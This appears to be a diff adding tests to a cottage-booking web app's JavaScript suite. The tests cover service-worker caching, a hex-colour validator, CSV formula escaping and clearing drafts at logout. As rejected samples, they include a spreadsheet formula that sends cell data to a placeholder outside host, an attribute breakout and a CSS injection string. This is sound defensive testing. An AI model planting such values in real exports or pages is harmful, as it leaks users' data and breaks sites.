@@ -829,6 +829,46 @@ try {
         .some((l) => /admin\\?\.js/.test(l) && /return/.test(l)));
 } catch (e) { check('sw.js precache version check ran (' + e.message + ')', false); }
 
+// 6c-iv. THE SERVICE WORKER'S OWN FETCH LISTENER, DRIVEN: sw.js runs in a sandbox
+// with a fake cache and a counting fetch. A ?v=-pinned asset cannot change under
+// its URL, so once cached it is served with no network at all; stale-while-
+// revalidate re-fetched and re-wrote the megabyte bundles on every page load.
+pendingChecks.push((async () => {
+    const swSrc = fs.readFileSync(path.join(path.dirname(HTML_PATH), 'sw.js'), 'utf8');
+    const on = {};
+    const store = new Map();
+    let fetches = 0;
+    let puts = 0;
+    const res = (body) => ({ ok: true, body, clone() { return res(body); } });
+    const key = (r) => (typeof r === 'string' ? r : r.url);
+    const cache = { match: async (r) => store.get(key(r)), put: async (r, v) => { puts++; store.set(key(r), v); }, addAll: async () => {}, keys: async () => [], delete: async () => true };
+    const sb = {
+        self: { addEventListener: (t, fn) => { on[t] = fn; }, location: { origin: 'https://chb.test' }, registration: {}, clients: {} },
+        caches: { open: async () => cache, keys: async () => [], delete: async () => true },
+        fetch: async (r) => { fetches++; return res('net ' + key(r)); },
+        Response: { error: () => ({ ok: false }) },
+        URL, console, setTimeout, Promise,
+    };
+    vm.createContext(sb);
+    vm.runInContext(swSrc, sb);
+    const get = async (url) => {
+        let p = null;
+        const waits = [];
+        on.fetch({ request: { method: 'GET', url, mode: 'no-cors', headers: { get: () => '' } }, respondWith: (x) => { p = x; }, waitUntil: (x) => waits.push(x) });
+        const r = await p;
+        await Promise.all(waits);
+        return r;
+    };
+    const a = await get('https://chb.test/app.js?v=9');
+    check('a pinned asset not yet cached is fetched once and kept', fetches === 1 && puts === 1 && a && a.body === 'net https://chb.test/app.js?v=9');
+    const b = await get('https://chb.test/app.js?v=9');
+    check('…and from then on it is served from the cache with NO network request and no rewrite', fetches === 1 && puts === 1 && b && b.body === a.body);
+    store.set('https://chb.test/logo.svg', res('cached logo'));
+    const before = fetches;
+    const c = await get('https://chb.test/logo.svg');
+    check('an unpinned asset still answers from the cache and refreshes behind it', c && c.body === 'cached logo' && fetches === before + 1);
+})().catch((e) => check('the service worker fetch check ran (' + e.message + ')', false)));
+
 // 6c-iii. Migration naming convention: NEW migrations must be
 // migration-NNN-<slug>.sql (NNN ≥ 100, applied after all legacy files by
 // migrate.php's migration_sort — see test-migrate.php). The legacy names below
@@ -2255,6 +2295,53 @@ console.log('\n== 12d. The clock and the money format are built once ==');
     const money = vm.runInContext('[gbp(0), gbp(1234.5), gbp(-12.345), gbp(1e6)].join(" | ")', ctx);
     check(`the money format is byte-identical (${money})`, money === '£0.00 | £1,234.50 | £-12.35 | £1,000,000.00');
     vm.runInContext('Intl.DateTimeFormat = __RD; Intl.NumberFormat = __RN;', ctx);
+}
+
+// ---- 12e. A cottage's colour is only ever #RRGGBB ----------------------------
+// It is painted into style attributes (Today's timeline, the booking sheet) and
+// into the stylesheet generated for every visitor, and the server's `save` took
+// any string — a quote or a brace broke out of all of them. rates.php refuses one
+// now (test-integration §4); this is the client half, for a value already stored.
+console.log('\n== 12e. A cottage colour is only ever #RRGGBB ==');
+{
+    const hex = (v) => vm.runInContext('chbHexColour(' + JSON.stringify(v) + ')', ctx);
+    check('a #RRGGBB code passes through', hex('#8FB3C7') === '#8FB3C7' && hex('#12ab34') === '#12ab34');
+    check('a quote, a brace or a word does not', hex('#8fb3c7" data-act="x') === '' && hex('red;}body{display:none') === '' && hex('red') === '' && hex('') === '');
+    check('a non-string does not', vm.runInContext('chbHexColour(null) + chbHexColour(12) + chbHexColour({})', ctx) === '');
+    // THE WIRING: every place the payload's colour enters the client goes through it.
+    check('the cottage list, propertyMeta and the generated stylesheet all read it through chbHexColour',
+        appScript.includes('accent: chbHexColour(p.accent),') &&
+        appScript.includes("accent: chbHexColour(p.accent) || existing.accent || '#8FB3C7',") &&
+        appScript.includes("const a = chbHexColour((propertyMeta[k] && propertyMeta[k].accent) || p.accent) || '#8FB3C7';") &&
+        !/accent:\s*p\.accent\s*\|\|/.test(appScript));
+}
+
+console.log('\n== 12h. A CSV cell that starts like a formula is written as text ==');
+{
+    const safe = (v) => vm.runInContext('chbCsvSafe(' + JSON.stringify(v) + ')', ctx);
+    check('a formula-shaped cell gets a leading apostrophe', safe('=IMAGE("https://x.example/?"&A3)') === '\'=IMAGE("https://x.example/?"&A3)' && safe('+cmd') === "'+cmd" && safe('@SUM(1)') === "'@SUM(1)" && safe('-2+3') === "'-2+3");
+    check('…a plain number, negative or not, and ordinary text are left alone', safe('-12.50') === '-12.50' && safe('75') === '75' && safe('Anne Betts') === 'Anne Betts');
+    check('both exports read their cells through it', /const esc = \(v\) => `"\$\{chbCsvSafe\(v\)/.test(adminScript) && /const s = chbCsvSafe\(v\);/.test(adminScript));
+}
+
+console.log('\n== 12i. Signing out leaves no unsent message to a guest on the device ==');
+{
+    // A Storage-shaped stub (length + key(i)), so the prefix sweep really walks it.
+    const mk = () => {
+        const d = new Map();
+        return { get length() { return d.size; }, key: (i) => [...d.keys()][i] ?? null, getItem: (k) => (d.has(k) ? d.get(k) : null),
+            setItem: (k, v) => { d.set(k, String(v)); }, removeItem: (k) => { d.delete(k); }, keys: () => [...d.keys()].sort() };
+    };
+    const ls = mk();
+    ['chb-was-admin', 'chb-daysheet', 'chb-dep-decisions', 'chb-ib-draft:e:anne@x.test', 'chb-ib-draft:p:07700',
+        'chb-cmp-draft:booking:42', 'chb-cmp-draft:enquiry:7', 'chb-last-guest', 'chb-theme', 'chb-cmdk-use'].forEach((k) => ls.setItem(k, 'x'));
+    const was = ctx.localStorage;
+    ctx.localStorage = ls;
+    try { vm.runInContext('chbOwnerDeviceForget()', ctx); } finally { ctx.localStorage = was; }
+    check('both kinds of draft go, however many there are', !ls.keys().some((k) => k.startsWith('chb-ib-draft:') || k.startsWith('chb-cmp-draft:')));
+    check('…with the boot hint, the day sheet and the deposit decisions', !ls.keys().some((k) => ['chb-was-admin', 'chb-daysheet', 'chb-dep-decisions'].includes(k)));
+    check('…and nothing that is not the owner\'s session (theme, search habits, the guest sheet\'s memory)', ls.keys().join(',') === 'chb-cmdk-use,chb-last-guest,chb-theme');
+    check('both ways out call it', /function forceAdminLogout\(\) \{[\s\S]{0,200}chbOwnerDeviceForget\(\);/.test(appScript) && /async function logoutStaff\(\) \{[\s\S]{0,500}chbOwnerDeviceForget\(\);/.test(adminScript));
 }
 
 // ============================================================
